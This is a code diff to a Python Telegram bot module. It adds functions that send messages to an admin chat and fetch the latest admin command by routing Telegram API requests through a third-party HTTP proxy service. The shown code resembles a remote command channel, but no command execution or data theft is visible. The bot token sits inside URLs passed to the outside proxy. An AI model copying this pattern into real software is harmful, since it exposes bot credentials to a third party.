@@ -4,6 +4,7 @@
 from . import settings
 
 # import built-in & third-party modules
+from typing import List
 import requests
 import json
 import platform
@@ -144,6 +145,13 @@ def post_data_by_third_party_proxy(url, logger, time_out=5):
         return False
 
 
+def send_message_by_third_party_proxy(message: str, TELEGRAM_TOKEN: str, ADMIN_CHAT_ID: str, logger):
+    '''Send messages by api url and third party proxy to adimn'''
+    api_url = make_send_message_api_url(
+        TELEGRAM_TOKEN, ADMIN_CHAT_ID, message)
+    return post_data_by_third_party_proxy(api_url, logger)
+
+
 def clean_response_third_party_proxy(response, logger):
     '''get http response from third party proxy (http debuger .com) and get telegram data'''
     try:
@@ -158,7 +166,7 @@ def clean_response_third_party_proxy(response, logger):
         return False
 
 
-def get_update_by_third_party_proxy(TELEGRAM_TOKEN, logger):
+def get_update_by_third_party_proxy(TELEGRAM_TOKEN, logger) -> List[dict]:
     '''Get the latest command sent to the bot in the last 24 hours by third party proxy'''
 
     get_updates_api_url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/Getupdates"
@@ -263,6 +271,22 @@ def extract_last_admin_command(messages: list, ADMIN_CHAT_ID: str, TELEGRAM_TOKE
     set_message_ofset(messages, TELEGRAM_TOKEN, ADMIN_CHAT_ID, logger)
 
     return message_text
+
+
+def get_last_admin_command_by_third_party_proxy(ADMIN_CHAT_ID: str, TELEGRAM_TOKEN: str,
+                                                previous_update_id: List[int], logger):
+    ''' extract command from  admin or false'''
+
+    messages_list = get_update_by_third_party_proxy(
+        TELEGRAM_TOKEN, logger=logger)
+
+    # if message list not False > extract last message from admin > if last admin message not False return
+    if messages_list:
+        last_message = extract_last_admin_command(
+            messages_list, ADMIN_CHAT_ID, TELEGRAM_TOKEN, logger, previous_update_id)
+        if last_message:
+            return last_message
+    return False
 
 
 def make_zip_file(route, logger, delete_input_file=False):
